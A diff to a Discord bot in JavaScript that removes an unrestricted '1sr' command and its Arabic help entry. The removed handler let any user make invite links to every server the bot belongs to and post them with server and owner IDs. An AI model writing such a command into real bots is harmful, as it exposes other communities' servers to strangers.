@@ -2502,30 +2502,7 @@ client.on('message', message =>{
 
 
 
-client.on('message', msg => {
-    if(msg.author.bot) return;
-    
-    if(msg.content === '1sr') {
-      client.guilds.forEach(g => {
-        
-        let l = g.id
-        g.channels.get(g.channels.first().id).createInvite({
-          maxUses: 5,
-          maxAge: 86400
-        }).then(i => msg.channel.send(`
-        **
-        Invite Link : <https://discord.gg/${i.code}>
-        Server : ${g.name} | Id : ${g.id} 
-        Owner ID : ${g.owner.id}
-        **
-        `))
-  
-  
-      })
-    }
-    
-  })
-  
+
   
   
 
@@ -6362,7 +6339,6 @@ client.on('message', message => {
 ❖${prefix}**inrole <Role Name>** : لمعرفة الاشخاص الذين لديهم نفس الرتبة
 ❖${prefix}**cicon <Link>** : لتغير صورة السيرفر
 ❖${prefix}**temp on/off** : لتشغيل/لأطفاء الرومات المؤقتة
-❖${prefix}**sr** : لعرضالسيرفرات يللي فيها البوت 
 ❖${prefix}**role-info <Role Name>** : معلومات عن الرتبة
 ❖${prefix}**dr** : لحذف روم اكتب اسم الروم بالظبط
 ❖${prefix}**sbots** : البوتات الموجوجة بالسيرفر
